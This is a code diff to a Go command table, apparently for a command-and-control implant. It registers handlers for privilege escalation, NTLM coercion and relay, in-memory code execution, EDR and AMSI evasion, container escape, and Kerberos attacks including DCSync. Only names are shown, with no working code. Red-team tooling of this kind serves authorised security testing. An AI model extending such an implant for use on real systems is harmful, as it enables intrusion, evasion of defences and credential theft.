@@ -124,6 +124,8 @@ func init() {
 		"token_revert":              handleTokenRevert,
 		"rev2self":                  handleTokenRevert,
 		"token_whoami":              handleTokenWhoami,
+		"named_pipe_impersonate":    handleNamedPipeImpersonate,
+		"juicy_potato":              handleJuicyPotato,
 		"fodhelper":                 handleFodhelper,
 		"slui":                      handleSluiUAC,
 		"eventvwr":                  handleEventvwrUAC,
@@ -156,11 +158,98 @@ func init() {
 		// Profile Rotation
 		"profile_rotate":            handleProfileRotate,
 
+		// Config Push
+		"config_push":               handleConfigPush,
+
+		// Working Hours
+		"set_working_hours":         handleSetWorkingHours,
+
+		// Per-Agent Kill Date
+		"set_kill_date":             handleSetKillDate,
+		"clear_kill_date":           handleClearKillDate,
+
 		// EDR Monitor
 		"edr_status":                handleEdrStatus,
 
 		// Ghost Protocol
 		"ghost_mode_status":         handleGhostModeStatus,
 		"ghost_mode_exit":           handleGhostModeExit,
+
+		// Reflective DLL Injection
+		"reflectdll_inject":         handleReflectDLLInject,
+
+		// NTLM Coerce Attacks
+		"coerce_printerbug":         handleCoercePrinterBug,
+		"coerce_petitpotam":         handleCoercePetitPotam,
+		"coerce_dfs":                handleCoerceDFS,
+
+		// NTLM Relay
+		"relay_ntlm_start":          handleRelayNTLMStart,
+		"relay_ntlm_stop":           handleRelayNTLMStop,
+		"ntlm_help":                 handleNTLMHelp,
+
+		// Certificate Store Theft
+		"cert_store_list":           handleCertStoreList,
+
+		// CLR In-Process Execution
+		"clr_exec_assembly":         handleCLRExecAssembly,
+		"clr_powershell":            handleCLRPowerShell,
+
+		// Egress Detection
+		"run_egress":                handleRunEgress,
+
+		// BloodHound / SharpHound
+		"sharphound":                handleSharpHound,
+
+		// Interactive Shell
+		"interactive_shell_start":  handleInteractiveShellStart,
+		"interactive_shell_write":  handleInteractiveShellWrite,
+		"interactive_shell_stop":   handleInteractiveShellStop,
+
+		// Multi-C2 Mode
+		"set_c2_mode":              handleSetC2Mode,
+
+		// Tunnel Routes (Chisel-style subnet routing)
+		"tunnel_add_route":         handleTunnelAddRoute,
+		"tunnel_remove_route":      handleTunnelRemoveRoute,
+
+		// P2P Mesh Auto-Discovery
+		"gossip_discover":          handleGossipDiscover,
+
+		// Container Escape
+		"container_detect":         handleContainerDetect,
+		"container_escape":         handleContainerEscape,
+		"container_docker":         handleContainerDocker,
+		"container_k8s":            handleContainerK8s,
+
+		// Sleep Mask Kit
+		"set_sleep_mask":           handleSetSleepMask,
+		"set_sleep_mask_advanced":  handleSetSleepMaskAdvanced,
+
+		// Kernel-Level Evasion
+		"kernel_callback":          handleEvasionKernelCallback,
+		"etwti":                    handleEvasionETWTI,
+		"enum_callbacks":           handleEvasionEnumCallbacks,
+		"objcb":                    handleEvasionObjCB,
+		"imgload":                  handleEvasionImgLoad,
+
+		// BOF Infection (download from server, execute in memory)
+		"bof_infection":            handleBOFInfection,
+
+		// Sandbox Detection
+		"sandbox_detect":           handleSandboxDetect,
+		"sandbox_detect_advanced":  handleSandboxDetectAdvanced,
+
+		// Hardware Breakpoint Evasion
+		"amsi_hardware_bp":         handleAMSIHardwareBP,
+		"etw_hardware_bp":          handleETWHardwareBP,
+
+		// Kerberos Advanced Attacks
+		"find_delegation":          handleFindDelegation,
+		"constrained_deleg":        handleConstrainedDeleg,
+		"rbcd":                     handleRBCD,
+		"bronze_bit":               handleBronzeBit,
+		"adminsdholder":            handleAdminSDHolder,
+		"dcsync_machine":           handleDCSyncMachine,
 	}
 }
